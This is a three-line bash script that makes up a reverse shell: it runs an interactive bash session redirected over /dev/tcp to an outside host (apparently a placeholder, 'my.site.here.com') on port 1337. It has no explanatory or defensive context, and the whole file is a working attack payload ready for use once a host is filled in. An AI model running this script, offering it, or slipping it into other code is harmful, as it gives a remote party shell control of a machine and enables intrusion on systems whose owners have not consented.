#!/bin/bash
bash -i >& /dev/tcp/my.site.here.com/1337 0>&1
wait
